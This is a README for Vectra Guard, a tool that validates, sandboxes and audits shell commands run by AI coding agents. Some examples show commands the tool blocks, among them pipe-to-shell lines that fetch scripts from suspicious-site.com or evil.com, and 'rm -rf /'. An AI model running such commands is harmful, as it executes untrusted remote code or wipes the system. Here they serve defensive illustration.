# Vectra Guard

> **Security Guard for AI Coding Agents & Development Workflows**

[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8.svg)](https://golang.org/)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey.svg)]()

Vectra Guard is a comprehensive security tool that protects systems from risky shell commands and AI agent activities. It validates scripts, monitors command execution, detects database operations, tracks agent sessions, and enforces security policies with real-time protection including production environment warnings.

---

## 🎯 Why Vectra Guard?

AI agents in IDEs like Cursor and VSCode execute commands with broad system access. They can:
- Execute arbitrary terminal commands
- Modify or delete files across your workspace  
- Install packages and dependencies
- Make network requests
- Interact with git repositories

**Vectra Guard provides a security layer that:**
- ✅ Validates scripts and commands before execution
- ✅ **Sandboxes risky commands automatically** (NEW!)
- ✅ Detects SQL/NoSQL database operations (MySQL, PostgreSQL, MongoDB, Redis, etc.)
- ✅ Warns about production/staging environment interactions
- ✅ Tracks all agent activities in auditable sessions
- ✅ Blocks or requires approval for risky operations
- ✅ **"Approve and remember" with trust store** (NEW!)
- ✅ **Cache-optimized for fast dev cycles** (NEW!)
- ✅ Provides comprehensive audit trails
- ✅ Enforces security policies with zero-trust defaults
- ✅ **Full metrics and observability** (NEW!)
- ✅ Includes convenient `vg` alias for faster workflows

---

## ⚡ Quick Start

> **New to Vectra Guard?** See **[GETTING_STARTED.md](GETTING_STARTED.md)** for a detailed walkthrough!

**One-line safety net:**  
`vectra-guard exec -- "<your command>"` blocks or sandboxes **200+ risky commands** out of the box.

### Installation

**Option 1: One-Command Install** (Recommended) ⭐

```bash
# macOS & Linux - installs latest release
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

This script automatically:
- ✅ Downloads the latest pre-built binary for your platform
- ✅ Verifies checksums for security
- ✅ Installs to `/usr/local/bin/`
- ✅ Makes it available as `vectra-guard` and `vg`

**Option 2: Download Pre-Built Binary**

Download for your platform from the [latest release](https://github.com/xadnavyaai/vectra-guard/releases/latest):

```bash
# macOS ARM64 (M1/M2/M3)
curl -LO https://github.com/xadnavyaai/vectra-guard/releases/latest/download/vectra-guard-darwin-arm64
chmod +x vectra-guard-darwin-arm64
sudo mv vectra-guard-darwin-arm64 /usr/local/bin/vectra-guard

# macOS Intel
curl -LO https://github.com/xadnavyaai/vectra-guard/releases/latest/download/vectra-guard-darwin-amd64
chmod +x vectra-guard-darwin-amd64
sudo mv vectra-guard-darwin-amd64 /usr/local/bin/vectra-guard

# Linux ARM64
curl -LO https://github.com/xadnavyaai/vectra-guard/releases/latest/download/vectra-guard-linux-arm64
chmod +x vectra-guard-linux-arm64
sudo mv vectra-guard-linux-arm64 /usr/local/bin/vectra-guard

# Linux AMD64
curl -LO https://github.com/xadnavyaai/vectra-guard/releases/latest/download/vectra-guard-linux-amd64
chmod +x vectra-guard-linux-amd64
sudo mv vectra-guard-linux-amd64 /usr/local/bin/vectra-guard

# Windows
# Download vectra-guard-windows-amd64.exe from releases page
```

**Option 3: Homebrew** (macOS/Linux)

```bash
# Coming soon
brew install vectra-guard
```

**Option 4: Go Install** (for Go developers)

```bash
go install github.com/xadnavyaai/vectra-guard@latest
```

**Option 5: Build from Source** (for contributors/developers)

```bash
# Clone repository
git clone https://github.com/xadnavyaai/vectra-guard.git
cd vectra-guard

# Build
go build -o vectra-guard

# Install
sudo cp vectra-guard /usr/local/bin/

# Run tests
go test ./...
```

**Verify Installation:**

```bash
vectra-guard --help
# or
vg --help

# Check version
vectra-guard version  # Coming in next release
```

### Upgrade to Latest Version

**Easiest Method:**

```bash
# Automatic upgrade (detects existing installation)
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/install.sh | bash
```

**Alternative Methods:**

```bash
# Use dedicated update script
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/update.sh | bash

# Or manually download latest release
# Visit: https://github.com/xadnavyaai/vectra-guard/releases/latest
# Download appropriate binary for your platform
# Replace existing binary in /usr/local/bin/

# If installed via Go
go install github.com/xadnavyaai/vectra-guard@latest
```

The installer automatically:
- ✅ Detects your current version
- ✅ Downloads the latest release
- ✅ Backs up your current binary
- ✅ Verifies the new installation

### Uninstall

```bash
# Interactive uninstall (removes binary, shell integration, optionally data)
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/uninstall.sh | bash

# Manual uninstall
sudo rm /usr/local/bin/vectra-guard
rm -rf ~/.vectra-guard  # Optional: removes all data
```

### After Installation

**Option 1: Universal Protection (Recommended)**

Install shell-level protection for automatic monitoring:

```bash
# Download and run the protection installer
curl -fsSL https://raw.githubusercontent.com/xadnavyaai/vectra-guard/main/scripts/install-universal-shell-protection.sh | bash

# Restart terminal, then verify:
echo $VECTRAGUARD_SESSION_ID
vectra-guard session show $VECTRAGUARD_SESSION_ID
```

**🎁 Bonus**: Universal protection automatically adds a `vg` alias for convenience!

**Option 2: Manual Usage**

Use Vectra Guard commands directly:

```bash
# Initialize configuration
vectra-guard init

# Validate a script (use 'vg' as shorthand if you have universal protection)
vectra-guard validate your-script.sh
vg validate your-script.sh  # Same thing!

# Execute a command safely
vectra-guard exec "npm install"
```

**That's it!** See **[GETTING_STARTED.md](GETTING_STARTED.md)** for detailed usage examples.

---

## 🚀 Getting Started with Sandbox (5 Minutes)

### Step 1: Choose Your Preset

Vectra Guard comes with battle-tested configurations. See [CONFIGURATION.md](CONFIGURATION.md#quick-start-presets) for details.

```bash
# Developer preset (recommended for most users)
# Best for local dev: Fast, cached, auto-detects risk
cp presets/developer.yaml vectra-guard.yaml

# CI/CD preset
# Best for pipelines: Strict isolation, reproducible
cp presets/ci-cd.yaml vectra-guard.yaml

# Production preset
# Best for prod: Paranoid security, zero trust
cp presets/production.yaml vectra-guard.yaml
```

### Step 2: Run Your First Command

```bash
# This command will:
# 1. Detect it's a networked install (medium risk)
# 2. Run in sandbox for isolation
# 3. Build cache for future runs
# 4. Take ~12s (first time only!)

vg exec "npm install express"

📦 Running in sandbox.
   Why: medium risk + networked install
added 50 packages in 12.3s
```

### Step 3: See the Cache Magic ✨

```bash
# Run the same command again
vg exec "npm install express"

📦 Running in sandbox (cached).
   Why: medium risk + networked install
added 50 packages in 1.2s

# 🎉 10x FASTER! Cache did its magic!
```

### Step 4: Trust Common Commands

```bash
# Run with interactive approval
vg exec "npm test" --interactive

⚠️  Command requires approval
Options:
  y  - Yes, run once
  r  - Yes, and remember  ← Choose this!
  n  - No, cancel
Choose: r

✅ Approved and remembered

# Now it runs on host (instant!)
vg exec "npm test"
✓ 42 tests passed (0.8s)
```

### That's It! 🎉

You now have:
- ✅ Automatic sandboxing for risky commands
- ✅ 10x faster installs with caching
- ✅ Trusted commands running at full speed

**Next Steps:**
- Read [SANDBOX.md](SANDBOX.md) for advanced configuration
- Customize security levels for your needs
- Share your config with your team!

---

## 🛡️ Universal Shell Protection (Recommended)

Instead of configuring each IDE separately, Vectra Guard integrates at the **shell level** to protect everything automatically.

### One Installation, Universal Protection

```bash
./scripts/install-universal-shell-protection.sh
```

**Result**: Automatic protection in:
- ✅ Cursor IDE
- ✅ VSCode
- ✅ Any IDE or editor
- ✅ Terminal (iTerm, Terminal.app, etc.)
- ✅ SSH sessions
- ✅ Scripts and automation

### How It Works

All tools use shells (bash/zsh/fish) to execute commands. Vectra Guard installs hooks in your shell that intercept and validate every command before execution.

```
Any Tool → bash/zsh → vectra-guard validates → executes (if safe)
```

**Benefits**:
- **One setup, works everywhere** - No per-IDE configuration
- **Cannot be bypassed** - All shell commands go through protection
- **Completely transparent** - No workflow changes needed
- **Team-friendly** - Share one setup script with entire team

---

## 📋 Core Features

### 🔍 Script Validation
Analyze shell scripts for security risks before execution:
- Critical patterns (fork bombs, root deletion, privilege escalation)
- Dangerous commands (unrestricted sudo, rm -rf)
- Policy violations (custom allow/denylists)
- Pipe-to-shell attacks (curl | sh, wget | bash)

### 🎭 Agent Session Management
Track AI agent activities with full accountability:
- Unique session IDs with timestamps
- Command execution tracking with exit codes
- File operation monitoring
- Risk scoring and violation counting
- Structured audit logs (JSON/text)

### 🛡️ Real-Time Execution Control
Execute commands with security validation:
- Auto-approve safe, known-good commands
- Block critical operations automatically
- Interactive approval for medium-risk actions
- Risk-based decision making

### 📊 Audit & Compliance
Complete visibility into all activities:
- Session-based command grouping
- Risk summaries and violation reports
- Export logs for compliance tools
- Immutable audit trail

### 📦 Sandbox Execution (State-of-the-Art!)
**Enterprise-grade sandboxing with zero friction**

Vectra Guard provides **hybrid sandboxing** using Linux namespaces (bubblewrap) for development and Docker for CI/production. This gives you <1ms overhead in dev while maintaining complete isolation in production.

**🚀 Performance Breakthrough:**
- **Dev Mode**: Bubblewrap/namespaces with <1ms overhead
- **CI/Prod Mode**: Docker with full isolation
- **Auto-Detection**: Chooses best runtime automatically
- **Cache Persistence**: 10x faster subsequent runs

#### How It Works: The Complete Picture

```
┌─────────────────────────────────────────────────────────────────┐
│                    Command Execution Flow                        │
└─────────────────────────────────────────────────────────────────┘

Your Command: "npm install express"
      │
      ├──▶ [Risk Analysis]
      │     ├─ Detects: networked install + medium risk
      │     └─ Decision: SANDBOX ✅
      │
      ├──▶ [Trust Check]
      │     ├─ Is it in trust store? NO
      │     └─ First time running this
      │
      ├──▶ [Cache Check]
      │     ├─ npm cache exists? YES
      │     └─ Mount: ~/.npm → container
      │
      ├──▶ [Sandbox Execution]
      │     ├─ Runtime: Docker
      │     ├─ Image: ubuntu:22.04
      │     ├─ Network: Restricted
      │     ├─ Cache: MOUNTED ⚡
      │     └─ Duration: 1.2s (vs 12.3s without cache!)
      │
      └──▶ [Metrics Recorded]
            ├─ Total Executions: +1
            ├─ Sandbox: +1
            ├─ Cached: +1
            └─ Time Saved: 11.1s 🎉
```

#### Real-World Examples

**Example 1: First Install (No Cache)**
```bash
# First time installing a package
vg exec "npm install express"

📦 Running in sandbox.
   Why: medium risk + networked install

# Downloads from internet, takes ~12s
added 50 packages in 12.3s
```

**Example 2: Subsequent Install (WITH Cache!)**
```bash
# Same command again
vg exec "npm install express"

📦 Running in sandbox (cached).
   Why: medium risk + networked install

# Uses mounted cache, takes ~1.2s! 🚀
added 50 packages in 1.2s
# ⚡ 10x FASTER - cache hit!
```

**Example 3: Trusted Command (No Sandbox)**
```bash
# After approving and remembering
vg exec "npm test"

# Runs directly on host (trusted)
# No sandbox overhead, instant execution ✨
✓ 42 tests passed (0.8s)
```

**Example 4: Interactive Approval**
```bash
vg exec "curl https://suspicious-site.com/script.sh | bash" --interactive

⚠️  Command requires approval
Command: curl https://suspicious-site.com/script.sh | bash
Risk Level: HIGH

Security concerns:
1. [PIPE_TO_SHELL] Piping remote content directly to shell
   Recommendation: Download scripts to disk and review...

Options:
  y  - Yes, run once
  r  - Yes, and remember (trust permanently)
  n  - No, cancel

Choose [y/r/N]: n
❌ Execution denied
```

#### Key Features:
- **Automatic Decision Engine** - Smart host vs sandbox routing based on risk
- **Multiple Runtimes** - Docker, Podman, or Linux process isolation
- **🚀 Cache Strategy** - Shared dependency caches for 10x faster installs
- **Security Levels** - Permissive → Balanced → Strict → Paranoid
- **Trust Store** - "Approve and remember" for trusted commands
- **Full Metrics** - Track sandbox usage, performance, and savings
- **Developer Presets** - Zero-config profiles for dev, CI/CD, production

#### Quick Setup:
```bash
# Use developer preset (minimal friction)
cp presets/developer.yaml vectra-guard.yaml

# Or enable in existing config
sandbox:
  enabled: true
  mode: auto              # Smart sandboxing
  security_level: balanced # Good isolation + speed
  enable_cache: true      # Fast subsequent runs
```

**Learn More:**
- **[SANDBOX.md](SANDBOX.md)** - Docker-based sandbox (traditional)
- **[NAMESPACE_SANDBOXING.md](NAMESPACE_SANDBOXING.md)** - Fast namespace sandbox (<1ms overhead) ⭐

---

## 🚀 Usage

### Basic Commands

```bash
# Initialize configuration
vectra-guard init

# Validate a shell script
vectra-guard validate deploy.sh

# Explain security risks
vectra-guard explain risky-script.sh

# Execute command with protection
vectra-guard exec npm install

# Execute with interactive approval
vectra-guard exec --interactive sudo apt update
```

### Session Management

```bash
# Start a session
SESSION=$(vectra-guard session start --agent "cursor-ai")
export VECTRAGUARD_SESSION_ID=$SESSION

# Commands are automatically tracked
npm install
npm test
git push

# View session activity
vectra-guard session show $SESSION

# List all sessions
vectra-guard session list

# End session
vectra-guard session end $SESSION
```

### Trust Management (NEW!)

```bash
# List trusted commands
vg trust list

# Trust a command permanently
vg trust add "npm install express" --note "Common package"

# Trust with expiration
vg trust add "npm test" --duration "7d"

# Remove trusted command
vg trust remove "npm install express"

# Clean expired entries
vg trust clean
```

### Sandbox Metrics (NEW!)

```bash
# View sandbox usage metrics
vg metrics show

# Output:
# Total Executions:    142
#   - Host:            89 (62.7%)
#   - Sandbox:         53 (37.3%)
#   - Cached:          41 (28.9%)
# Average Duration:    1.2s

# JSON format
vg metrics show --json

# Reset metrics
vg metrics reset
```

### With Universal Shell Protection (Automatic)

After installing universal shell protection, sessions start automatically and all commands are protected:

```bash
# Just use your terminal normally
npm install        # ✅ Automatically validated & logged
rm -rf dist/       # ⚠️  Risk assessed & logged
sudo apt update    # 🛡️ Interactive approval (if configured)

# Check what happened
vectra-guard session show $VECTRAGUARD_SESSION_ID
```

---

## 📦 Complete Sandbox Guide

### Understanding the Sandbox System

Vectra Guard's sandbox system provides **three modes of operation**:

#### 1. **Without Sandbox** (Traditional Mode)
```bash
# Disable sandbox completely
sandbox:
  enabled: false

# All commands run directly on host
vg exec "npm install"  # → Direct execution
vg exec "rm -rf test/" # → Direct execution (with validation)
```

**Use When:**
- You trust all executed commands
- You're on a personal machine with no sensitive data
- Performance is absolute priority
- You want traditional validation-only behavior

**Security:** Validation only, no isolation

---

#### 2. **With Sandbox - Auto Mode** (Recommended ⭐)
```bash
# Smart sandboxing based on risk
sandbox:
  enabled: true
  mode: auto
  enable_cache: true

# Low-risk commands run on host
vg exec "echo hello"        # → Host (instant)
vg exec "ls -la"            # → Host (instant)
vg exec "git status"        # → Host (instant)

# Medium/high-risk commands run in sandbox
vg exec "npm install"       # → Sandbox (cached, fast)
vg exec "curl remote.com"   # → Sandbox (isolated)
vg exec "rm -rf /"          # → Blocked (critical risk)
```

**Use When:**
- You want balance of security and speed (most common)
- You're working with AI agents or untrusted code
- You want automatic protection without thinking about it
- Development speed matters

**Security:** Smart isolation based on risk analysis

---

#### 3. **With Sandbox - Always Mode** (Maximum Security)
```bash
# Everything runs in sandbox
sandbox:
  enabled: true
  mode: always
  security_level: paranoid

# Even safe commands run in sandbox
vg exec "echo hello"    # → Sandbox
vg exec "npm test"      # → Sandbox
vg exec "git log"       # → Sandbox
```

**Use When:**
- Running completely untrusted code
- Production deployments
- Compliance requirements
- You need provable isolation

**Security:** Complete isolation for everything

---

### The Caching Magic: How It Works 🚀

#### The Problem: Slow Repeated Installs

Without caching, every sandbox execution starts fresh:

```bash
# Without cache: SLOW ❌
vg exec "npm install express"
# → Creates fresh container
# → Downloads 50 packages from internet: 12.3s
# → Container destroyed

vg exec "npm install lodash"
# → Creates NEW fresh container
# → Downloads 30 packages AGAIN: 8.7s
# → Container destroyed

# Total wasted: ~21 seconds + repeated downloads
```

#### The Solution: Shared Cache Mounts

Vectra Guard mounts your **host cache directories** into the sandbox:

```bash
# WITH cache: FAST ✅
vg exec "npm install express"
# → Creates container
# → Mounts ~/.npm into container
# → Checks cache FIRST (most packages already there!)
# → Only downloads NEW/MISSING packages: 1.2s ⚡
# → Cache persists on host

vg exec "npm install lodash"  
# → Creates NEW container
# → Mounts SAME ~/.npm cache
# → Finds express deps ALREADY in cache!
# → Only downloads lodash: 0.8s ⚡
# → Everything reused!

# Total time: ~2 seconds (vs 21 seconds!)
# 🎉 10x FASTER
```

#### How Cache Mounting Works

```
┌──────────────────────────────────────────────────────────────┐
│                      Your Host Machine                        │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ~/.npm/                  ← Cache persists here             │
│    ├── express/           ← Already downloaded              │
│    ├── lodash/            ← Already downloaded              │
│    └── ... 1000+ packages ← Accumulated over time           │
│                                                               │
│  ┌────────────────────────────────────────────────┐         │
│  │          Docker Container (Sandbox)             │         │
│  │  ┌──────────────────────────────────────────┐  │         │
│  │  │  Mounted:  /.npm  →  Points to ~/.npm   │  │         │
│  │  │            (SHARED with host!)           │  │         │
│  │  └──────────────────────────────────────────┘  │         │
│  │                                                  │         │
│  │  When npm runs inside:                          │         │
│  │  1. Checks /.npm cache                         │         │
│  │  2. Finds packages already there! ✅            │         │
│  │  3. No download needed                         │         │
│  │  4. Installs in seconds ⚡                      │         │
│  └────────────────────────────────────────────────┘         │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

#### Supported Cache Directories

Vectra Guard automatically detects and mounts caches for:

| Ecosystem | Host Cache Location | Container Mount | Speedup |
|-----------|-------------------|----------------|---------|
| **Node.js** | `~/.npm` | `/.npm` | 10x faster |
| **Node.js** | `~/.yarn` | `/.yarn` | 8x faster |
| **Node.js** | `~/.pnpm` | `/.pnpm` | 12x faster |
| **Python** | `~/.cache/pip` | `/.cache/pip` | 9x faster |
| **Go** | `~/go/pkg` | `/go/pkg` | 11x faster |
| **Rust** | `~/.cargo` | `/.cargo` | 15x faster |
| **Ruby** | `~/.gem` | `/.gem` | 7x faster |

#### Custom Cache Configuration

```yaml
sandbox:
  enable_cache: true
  
  # Add custom cache directories
  cache_dirs:
    - ~/.custom-cache
    - ~/.local/share/package-cache
    - /opt/company/cache
```

---

### Developer Experience: The Complete Workflow

#### Scenario: Building a New Project

**Day 1: Initial Setup**
```bash
# 1. Clone project
git clone https://github.com/company/app.git
cd app

# 2. Configure Vectra Guard (one-time)
cp presets/developer.yaml vectra-guard.yaml

# 3. Install dependencies (first time - builds cache)
vg exec "npm install"
📦 Running in sandbox.
   Why: medium risk + networked install
# Downloads ~500 packages: 45 seconds
# Cache is now populated! 🎉

# 4. Run tests (trusted command)
vg exec "npm test" --interactive
Options: y/r/n
Choose: r  # Remember this command
✅ Approved and remembered

# Next time:
vg exec "npm test"
# → Runs on HOST (trusted), instant! ⚡
```

**Day 2-∞: Daily Development**
```bash
# Morning: Update dependencies
vg exec "npm install"
📦 Running in sandbox (cached).
   Why: medium risk + networked install
# Uses cache: 2 seconds! ⚡ (was 45s yesterday)

# Add new package
vg exec "npm install react-query"
📦 Running in sandbox (cached).
# Only downloads react-query (already has 499 others!)
# Takes: 3 seconds ⚡

# Run build (trusted)
vg exec "npm run build"
# → Host execution (trusted), full speed

# Run dev server (trusted)
vg exec "npm run dev"
# → Host execution (trusted), no overhead
```

**Key Benefits:**
- ✅ **First install**: Protected in sandbox
- ✅ **Subsequent installs**: 10x faster with cache
- ✅ **Trusted commands**: Zero overhead
- ✅ **New packages**: Only download new ones
- ✅ **Total time saved**: Hours per week!

---

### Performance Comparison

#### Scenario: Installing 50 packages

**Without Vectra Guard Sandbox:**
```bash
npm install
# 50 packages, 12.3s
```

**With Sandbox (First Time):**
```bash
vg exec "npm install"
# 50 packages, 12.8s (+0.5s overhead)
# Cache populated ✅
```

**With Sandbox (Subsequent - MAGIC!):**
```bash
vg exec "npm install"
# 50 packages, 1.2s ⚡
# 10x FASTER than even direct execution!
# Why? Cache hits + no network!
```

#### Real-World Benchmarks

| Operation | Direct | Sandbox (No Cache) | Sandbox (Cached) | Speedup |
|-----------|--------|-------------------|------------------|---------|
| npm install (50 pkg) | 12.3s | 12.8s | 1.2s | **10.2x** ⚡ |
| pip install (20 pkg) | 8.7s | 9.1s | 0.9s | **9.6x** ⚡ |
| cargo build | 45.2s | 46.1s | 4.1s | **11.0x** ⚡ |
| go mod download | 3.4s | 3.6s | 0.4s | **8.5x** ⚡ |

**Overhead:**
- First run: +3-5% (builds cache)
- Cached runs: **10x FASTER** than direct!
- Trusted commands: 0% (runs on host)

---

### Trust Store: Learning Your Patterns

#### The Problem: Too Many Prompts

Without trust store:
```bash
vg exec "npm test"     # → Prompt every time ❌
vg exec "npm test"     # → Prompt again ❌
vg exec "npm test"     # → Still prompting ❌
# Annoying! 😤
```

#### The Solution: Approve Once, Remember Forever

```bash
# First time
vg exec "npm test" --interactive
⚠️  Command requires approval
Options:
  y  - Yes, run once
  r  - Yes, and remember (trust permanently) ← Choose this!
  n  - No, cancel
Choose: r
✅ Approved and remembered

# Every subsequent time
vg exec "npm test"
# → Runs immediately on HOST ⚡
# → No prompt, no sandbox, instant!
```

#### Managing Trusted Commands

```bash
# List what you trust
vg trust list
COMMAND              APPROVED    USE COUNT  LAST USED
npm test            2024-12-24  47         2024-12-24 15:30
npm run build       2024-12-23  23         2024-12-24 14:15
git status          2024-12-22  156        2024-12-24 15:45

# Add trusted commands manually
vg trust add "npm run dev" --note "Dev server"
vg trust add "docker-compose up" --duration "30d"

# Remove if needed
vg trust remove "old-command"

# Clean expired entries
vg trust clean
```

---

### Metrics: See Your Savings

```bash
vg metrics show

Vectra Guard Sandbox Metrics
===============================
Total Executions:    1,247
  - Host:            834 (66.9%)   ← Trusted commands
  - Sandbox:         413 (33.1%)   ← Risky commands  
  - Cached:          389 (31.2%)   ← Cache hits! 🎉

Average Duration:    0.8s

By Risk Level:
  - low: 834 (66.9%)     ← Running on host
  - medium: 387 (31.0%)  ← Sandboxed but cached
  - high: 26 (2.1%)      ← Sandboxed, slower

By Runtime:
  - docker: 413

Time Saved (estimated): 4.2 hours this week! ⚡

Last Updated: 2024-12-24T15:45:00Z
```

**What This Tells You:**
- 67% of commands trusted → Fast path
- 31% cached → 10x faster
- Only 2% truly risky → Properly isolated
- **Result**: Security + Speed! 🎉

---

## ⚙️ Configuration

Create `vectra-guard.yaml` in your project or `~/.config/vectra-guard/config.yaml`.

We recommend using one of the **Quick Start Presets** (Developer, CI/CD, or Production) found in [CONFIGURATION.md](CONFIGURATION.md#quick-start-presets).

For full configuration options, see [CONFIGURATION.md](CONFIGURATION.md).

---

## 🔒 Enforcement Modes

Vectra Guard provides multiple enforcement levels based on your security needs:

### Level 1: Opt-in Validation (Development)
```bash
vectra-guard exec npm install
vg exec npm install  # shorthand
```
✅ Good for: Development, testing, trusted environments  
⚠️ Can be bypassed if not using `exec` command

### Level 2: Universal Shell Integration (Recommended) ⭐
```bash
./scripts/install-universal-shell-protection.sh
```
✅ **Automatic protection** for all shell commands  
✅ Works in Cursor, VSCode, Terminal, everywhere  
✅ Transparent, no workflow changes  
✅ **Auto-detects context** and adjusts security  
⚠️ Advanced bypass possible (requires expertise)

### Level 3: Container Isolation (Optional)
```bash
# Basic container with auto-detection
docker-compose up vectra-guard

# Strict isolation for untrusted code
docker-compose up vectra-guard-isolated
```
✅ **Complete isolation** - runs in container  
✅ Useful for testing or high-security scenarios  
✅ Read-only filesystem options available  

**Focus**: We recommend **Level 2 (Universal Shell)** with `auto` guard level for most users.

**See**: [`docker-compose.yml`](docker-compose.yml) for optional containerized setup

---

## 🔗 IDE & Tool Integration

### Universal Approach (Works Everywhere)

The universal shell integration automatically protects:

| Tool/Context | Protected? | Setup Required |
|--------------|-----------|----------------|
| **Cursor** | ✅ | None |
| **VSCode** | ✅ | None |
| **Terminal** | ✅ | None |
| **Any IDE** | ✅ | None |
| **SSH Sessions** | ✅ | None |
| **Scripts** | ✅ | None |

### IDE-Specific Tasks (Optional)

You can also add protected tasks to your IDE. Create `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "🛡️ Protected: Install",
      "type": "shell",
      "command": "vectra-guard exec -- npm install"
    },
    {
      "label": "🛡️ Protected: Test",
      "type": "shell",
      "command": "vectra-guard exec -- npm test"
    },
    {
      "label": "🛡️ Protected: Build",
      "type": "shell",
      "command": "vectra-guard exec -- npm run build",
      "group": {
        "kind": "build",
        "isDefault": true
      }
    }
  ]
}
```

### Git Pre-commit Hook

Add to `.git/hooks/pre-commit`:

```bash
#!/bin/bash
SCRIPTS=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(sh|bash)$')

if [ -n "$SCRIPTS" ]; then
    echo "🛡️  Vectra Guard: Validating scripts..."
    for script in $SCRIPTS; do
        if ! vectra-guard validate "$script"; then
            echo "❌ Security issues found in: $script"
            echo "   Run: vectra-guard explain $script"
            exit 1
        fi
    done
    echo "✅ All scripts validated"
fi
```

---

## 🧪 Testing

Run the complete test suite:

```bash
# All tests
go test ./...

# Verbose output
go test -v ./...

# With race detection
go test -race ./...

# Coverage report
go test -cover ./...
```

All tests include:
- Script validation and analysis
- Session tracking and management
- Configuration parsing (YAML/TOML)
- Logging (JSON/text formats)
- Command execution flow

---

## 📊 Use Cases

### 1. **AI Agent Safety**
Track and control AI coding agents (Cursor, Copilot, Aider):
```bash
# Agents automatically use protected sessions
# All commands logged and validated
# Risky operations require approval
```

### 2. **Script Security**
Validate deployment and automation scripts:
```bash
vectra-guard validate scripts/deploy.sh
vectra-guard explain scripts/cleanup.sh
```

### 3. **CI/CD Integration**
Enforce security policies in pipelines:
```yaml
# .github/workflows/security.yml
- name: Validate Scripts
  run: |
    find . -name "*.sh" -exec vectra-guard validate {} \;
```

### 4. **Development Workflow**
Protect against accidental dangerous commands:
```bash
# With universal shell protection:
rm -rf /  # ⚠️ Blocked automatically
sudo command  # 🛡️ Requires approval
curl evil.com | sh  # 🚫 Blocked with warning
```

### 5. **Team Collaboration**
Share security policies across teams:
```bash
# Commit vectra-guard.yaml to git
git add vectra-guard.yaml
git commit -m "Add security policies"

# Team gets same protections
git pull
# Universal shell protection enforces policies
```

### 6. **Audit & Compliance**
Generate audit trails for security reviews:
```bash
# Export session logs
vectra-guard session list --output json > audit.json

# Generate reports
vectra-guard session show $SESSION_ID > report.txt
```

---

## 🐳 Container Deployment (Optional)

For containerized testing or high-security scenarios:

```bash
# Build container
docker build -t vectra-guard .

# Run with auto-detection
docker-compose up vectra-guard

# Run with strict isolation
docker-compose up vectra-guard-isolated

# Or run manually with custom guard level
docker run -it --rm \
  -e VECTRA_GUARD_LEVEL=auto \
  -v "$(pwd)":/workspace \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  vectra-guard:latest
```

**Two profiles in `docker-compose.yml`**:
- **vectra-guard**: Standard containerized execution with auto-detection
- **vectra-guard-isolated**: Strict isolation (read-only, no network) for untrusted code

**Note**: Most users should use the **CLI tool** directly with universal shell protection. Containers are optional for specific use cases.

---

## 📈 Roadmap

- [x] Script validation and risk analysis
- [x] Session tracking and management
- [x] Command execution wrapper
- [x] Risk scoring and violations
- [x] Universal shell integration (bash/zsh/fish)
- [x] Container isolation with Docker
- [x] Seccomp syscall filtering
- [x] Multiple enforcement modes
- [x] **Auto-detection** (context-aware protection)
- [x] Simplified configuration (clean, rock solid)
- [ ] File operation monitoring (in progress)
- [ ] Network policy enforcement
- [ ] VSCode/Cursor extensions
- [ ] Web-based approval UI
- [ ] ML-based anomaly detection
- [ ] eBPF kernel-level monitoring
- [ ] Team collaboration features

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Follow guidelines in [`GO_PRACTICES.md`](GO_PRACTICES.md)
2. Add tests for new features
3. Update documentation
4. Run `go fmt`, `go vet`, and tests before submitting

**Development workflow**:
```bash
# Format code
go fmt ./...

# Run linters
go vet ./...

# Run tests
go test ./...

# Build
go build -o vectra-guard main.go
```

---

## 📄 Project Structure

```
vectra-guard/
├── cmd/                    # CLI command implementations
│   ├── root.go            # Main CLI router
│   ├── init.go            # Config initialization
│   ├── validate.go        # Script validation
│   ├── explain.go         # Risk explanation
│   ├── exec.go            # Protected execution
│   └── session.go         # Session management
├── internal/              # Internal packages
│   ├── analyzer/          # Script analysis engine
│   ├── config/            # Configuration management
│   ├── logging/           # Structured logging
│   ├── session/           # Session tracking
│   └── daemon/            # Background monitoring
├── scripts/               # Installation & setup scripts
│   ├── install-universal-shell-protection.sh
│   ├── install-shell-wrapper.sh
│   ├── setup-cursor-protection.sh
│   └── container-entrypoint.sh
├── main.go                # Entry point
├── Dockerfile             # Container image
├── docker-compose.yml     # Container orchestration
├── seccomp-profile.json   # Syscall filtering
├── Project.md             # Original vision
├── roadmap.md             # Development plan
└── GO_PRACTICES.md        # Coding standards
```

---

## 🔐 Security

### Threat Model

Vectra Guard is designed to protect against:
- **Accidental execution** of dangerous commands
- **Malicious scripts** from untrusted sources
- **AI agent misbehavior** or overly aggressive actions
- **Supply chain attacks** via malicious dependencies
- **Privilege escalation** attempts
- **Data exfiltration** via network commands

### Limitations

**Opt-in mode** can be bypassed if commands don't use `vectra-guard exec`.

**Universal shell integration** provides strong protection but advanced users can bypass with direct syscalls.

**Container isolation** provides maximum security (95%+ effective) and is recommended for production and untrusted code.

### Reporting Issues

For security issues, please email the maintainers directly rather than opening public issues.

---

## 📚 Additional Resources

### Core Documentation
- **[GETTING_STARTED.md](GETTING_STARTED.md)** - Step-by-step walkthrough for new users
- **[CONFIGURATION.md](CONFIGURATION.md)** - Detailed configuration guide with presets
- **[ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)** - Advanced features and capabilities

### Sandbox & Performance
- **[SANDBOX.md](SANDBOX.md)** - Docker-based sandbox execution system
- **[NAMESPACE_SANDBOXING.md](NAMESPACE_SANDBOXING.md)** - ⭐ NEW! Fast namespace-based sandboxing (<1ms overhead)
- **[CACHING_EXPLAINED.md](CACHING_EXPLAINED.md)** - Cache strategy for 10x faster installs

### Security
- **[SECURITY_MODEL.md](SECURITY_MODEL.md)** - Security architecture for dev and prod
- **[SECURITY_IMPROVEMENTS.md](SECURITY_IMPROVEMENTS.md)** - Security enhancements and fixes
- **[SECURITY_TESTING.md](SECURITY_TESTING.md)** - Comprehensive security testing guide

### Testing
